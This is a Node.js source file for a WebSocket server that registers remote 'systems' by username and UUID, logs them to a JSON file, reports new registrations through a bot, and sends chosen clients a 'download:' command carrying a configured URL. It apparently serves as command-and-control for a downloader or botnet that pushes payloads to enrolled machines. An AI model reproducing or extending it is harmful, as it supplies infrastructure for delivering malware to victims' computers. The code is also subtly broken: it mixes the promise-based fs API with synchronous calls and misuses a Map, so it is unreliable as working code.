const WebSocket = require("ws");
const fs = require("fs").promises;
const path = require("path");
const { notifyLOG } = require("./bot.js");
const config = require("./config.json");
const systemsFile = path.join(__dirname, "systems.json");

let systems = fs.existsSync(systemsFile)
  ? JSON.parse(fs.readFileSync(systemsFile))
  : {};

const clients = new Map();

const wss = new WebSocket.Server({ port: 3010, path: "/ws" });
console.log("[*] ws server running on ws://localhost:3010/ws");

function saveSystems() {
  fs.writeFileSync(systemsFile, JSON.stringify(systems, null, 2));
}

wss.on("connection", (ws) => {
  console.log("[+] Client connected");
  let currentUsername = null;

  ws.on("message", (msg) => {
    try {
      const data = JSON.parse(msg);
      const { uuid, username, starttime, type } = data;

      if (type === "register") {
        currentUsername = username;
        clients.set(username, ws);

        if (!systems[username]) {
          systems[username] = { uuid, starttime, active: true };
          console.log(`[+] Registered new system: ${username}`);
        } else {
          systems[username].active = true;
        }
        saveSystems();
        notifyLOG(`❗️ registered new system -> ${username}`);
      }

      if (type === "ping" && username) {
        if (systems[username]) {
          systems[username].active = true;
          saveSystems();
        }
      }
    } catch (err) {
      console.warn(`[!] Invalid message: ${msg}`);
    }
  });

  ws.on("close", () => {
    if (currentUsername && systems[currentUsername]) {
      systems[currentUsername].active = false;
      delete clients[currentUsername];
      saveSystems();
      console.log(`[-] ${currentUsername} disconnected.`);
    }
  });
});

/**
 * @param {string} username
 */
function sendDownload(username) {
  const ws = clients[username];
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(`download:${config.downloadUrl}`);
    console.log(`[>] Sent download to ${username}`);
  } else {
    console.warn(`[!] ${username} is not connected.`);
  }
}

module.exports = { clients, systems, sendDownload };



